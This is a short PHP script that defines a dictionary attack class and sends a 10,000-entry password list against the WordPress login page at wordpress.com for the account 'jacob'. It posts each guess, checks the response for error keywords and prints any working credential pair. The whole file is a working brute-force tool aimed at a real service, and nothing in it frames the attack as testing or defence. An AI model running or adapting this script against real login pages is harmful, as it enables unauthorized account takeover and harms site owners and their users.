<?php

class DictAttack{
	protected $Login;
	function __construct(){
		include('login/login-oop.php');
		$this->Login = new Login;
	}

	function Test($url,$log,$pwd_list,$error_list){
		$pwd_list = explode("\n",$pwd_list);
		echo "Launching attack on $url\n::::::::==::::::::\n\n";
		foreach ($pwd_list as $key => $pwd) {
			//echo "$pwd \n";
			$post = 'log=' . $log . '&pwd=' . $pwd . '&wp-submit=Log+In';
			$new_error = $this->Login->TestCreds($url,$post,$log,$pwd,$error_list);
			if($new_error==false){
				echo "*******\nSUCCESS!\nCredential combiniation is viable.\nFound [Login/Password] Combo: [$log,$pwd]\n*******\n";
				return;
			}
			else{
				echo $new_error." - [Login/Password] Combo: [$log,$pwd] is seemingly invalid. \n";
			}
		}
	}
}
$pwd_list = file_get_contents("lists/10000pwd.txt");

$url = 'https://wordpress.com/wp-login.php';
$log = "jacob";
$error_list = array(
    "error",
    "suspend",
    "exceed",
    "forbidden",
);



$da = new DictAttack;
$da->Test($url,$log,$pwd_list,$error_list);